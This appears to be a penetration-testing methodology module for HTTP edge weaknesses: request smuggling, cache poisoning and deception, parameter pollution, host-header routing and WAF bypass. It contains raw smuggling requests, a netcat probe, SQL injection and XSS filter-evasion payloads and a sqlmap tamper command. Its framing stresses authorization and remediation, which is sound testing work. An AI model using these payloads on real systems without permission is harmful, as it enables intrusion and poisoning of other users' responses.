# HTTP Edge Module

Covers: HTTP request smuggling, HTTP/2 downgrade desync, web cache poisoning, web cache deception, HTTP parameter pollution, host routing confusion, WAF/CDN bypass, method override, header normalization, and SSL stripping/HSTS weaknesses.

## Goals

- Test protocol and intermediary behavior when CDNs, WAFs, reverse proxies, load balancers, and app servers disagree.
- Use low-impact detection first. HTTP edge bugs can affect other users.
- Prove exploitability only when explicitly authorized for active exploitation.

## Architecture Fingerprinting

```bash
scripts/openghost.sh exec-bash 'curl -s -I https://<target>/ | grep -iE "(server|via|x-served-by|x-cache|cf-ray|x-amz|x-varnish|x-fastly|x-akamai|x-sucuri|x-cdn)"'
scripts/openghost.sh exec-tool wafw00f https://<target>
```

Edge testing is most relevant when you see:

- CDN -> origin
- WAF -> reverse proxy
- HTTP/2 frontend -> HTTP/1.1 backend
- load balancer -> app server
- caching headers and `X-Cache`/`Age`
- inconsistent behavior between paths or methods

## HTTP Request Smuggling

Only run against authorized systems. Prefer timeout/differential probes before exploit payloads.

### CL.TE Detection

Frontend uses `Content-Length`; backend uses `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Detection

Frontend uses `Transfer-Encoding`; backend uses `Content-Length`.

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### TE.TE Detection

One component normalizes malformed `Transfer-Encoding`, the other does not.

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked\r
```

### Low-Impact Probe Example

```bash
scripts/openghost.sh exec-bash 'printf "POST / HTTP/1.1\r\nHost: <target>\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX" | nc <target> 80'
```

### Exploit Classes

- Frontend access-control bypass
- WAF bypass
- cache poisoning
- request queue poisoning
- victim request capture
- routing to internal-only paths

Do not attempt victim-impacting exploitation on production without explicit authorization.

## HTTP/2 Downgrade Desync

If the frontend accepts HTTP/2 and downgrades to HTTP/1.1 for backend, test for:

- pseudo-header confusion
- duplicate `content-length`
- forbidden header forwarding
- CRLF in translated headers
- path normalization differences

Evidence requires showing different frontend/backend interpretation, not only HTTP/2 support.

## Web Cache Poisoning

### Identify Cache

```bash
scripts/openghost.sh exec-bash 'curl -s -I "https://<target>/?cb=$(date +%s)" | grep -iE "(x-cache|cf-cache-status|age|vary|x-varnish|via|cache-control)"'
```

### Find Unkeyed Inputs

Headers commonly missed by cache keys:

```text
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Host
X-Forwarded-Server
Forwarded
Host
```

Tests:

```bash
scripts/openghost.sh exec-bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Host: evil.example" "https://<target>/?$CB" | grep evil.example'
scripts/openghost.sh exec-bash 'CB="oghost=$(date +%s)"; curl -s -H "X-Forwarded-Scheme: http" "https://<target>/?$CB" | head -40'
```

Confirmed when an unkeyed input is reflected in a cacheable response and can be served to another request without the malicious header.

## Web Cache Deception

### Pattern

1. Authenticated private page exists: `/account/settings`.
2. App routes `/account/settings/anything.css` to the same private page.
3. Cache treats `.css` as static and stores the authenticated response.
4. Attacker fetches cached static-looking URL.

### Testing

```bash
scripts/openghost.sh exec-bash 'curl -s -I -H "Cookie: session=<TEST_COOKIE>" https://<target>/account/settings/oghost.css | grep -iE "(cache|content-type|age)"'
scripts/openghost.sh exec-bash 'curl -s https://<target>/account/settings/oghost.css | head -40'
```

Use test accounts only.

## HTTP Parameter Pollution

Framework behavior with duplicate parameters:

| Technology | Example `?id=1&id=2` behavior |
|---|---|
| PHP | last value often wins |
| ASP.NET | values may concatenate |
| Flask/Django | first value often wins |
| Express | first or array depending parser |
| Java Servlet | first value often wins |

Attack ideas:

```text
?id=1&id=' OR 1=1--
?redirect_uri=https://legit.example&redirect_uri=https://evil.example
?amount=100&amount=1
?role=user&role=admin
```

Confirmed when frontend/WAF validates one value and backend uses another, or business logic changes materially.

## Host and Path Routing Confusion

Headers:

```text
Host
X-Forwarded-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Prefix
X-Forwarded-Proto
X-HTTP-Method-Override
```

Use cases:

- access internal route via `X-Original-URL: /admin`
- password reset poisoning via host header
- cache poisoning via forwarded host
- method override to bypass method-specific auth

Example:

```bash
scripts/openghost.sh exec-bash 'curl -s -i -H "X-Original-URL: /admin" https://<target>/not-admin | head -80'
```

## WAF and CDN Bypass

### Fingerprint First

```bash
scripts/openghost.sh exec-tool wafw00f https://<target>
scripts/openghost.sh exec-bash 'curl -s -I https://<target> | grep -iE "(cf-ray|x-sucuri|x-akamai|x-fastly|x-cdn|server)"'
```

### General Techniques

```text
URL encoding: %27%20OR%201%3D1--
Double encoding: %2527%2520OR%25201%253D1--
Unicode normalization: ' OR 1﹦1--
Case variation: UnIoN SeLeCt
Comment insertion: /**/UNION/**/SELECT
HPP splitting: ?q=UNION&q=SELECT
Method change: POST -> PUT/PATCH
Method override: X-HTTP-Method-Override
Chunked transfer body splitting
Content-Type confusion: JSON -> text/plain -> form
```

sqlmap tamper example:

```bash
scripts/openghost.sh exec-tool sqlmap -u "https://<target>/?id=1" --tamper=space2comment,between,randomcase,charunicodeencode --batch
```

### XSS WAF Bypass Examples

```html
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>
<details/open/ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

## SSL Stripping and HSTS

Check whether users can be downgraded to HTTP:

```bash
scripts/openghost.sh exec-bash 'curl -s -I http://<target> | grep -iE "(location|strict-transport)"'
```

Weaknesses:

- HTTP does not redirect to HTTPS
- redirect goes to HTTP path first
- HSTS missing
- HSTS `max-age=0` or very low
- missing `includeSubDomains` where subdomains carry sensitive cookies
- sensitive cookies not marked `Secure`

## Reporting Checklist

- Evidence of intermediary/cache/proxy behavior
- Low-impact detection request and response
- Cache key or desync explanation
- Proof another request/user can receive poisoned or affected response if claimed
- Scope and safety controls used
- Remediation: normalize headers, disable ambiguous TE/CL handling, align frontend/backend parsing, include headers in cache key, disable caching private pages, strict WAF/CDN rules, enforce HSTS
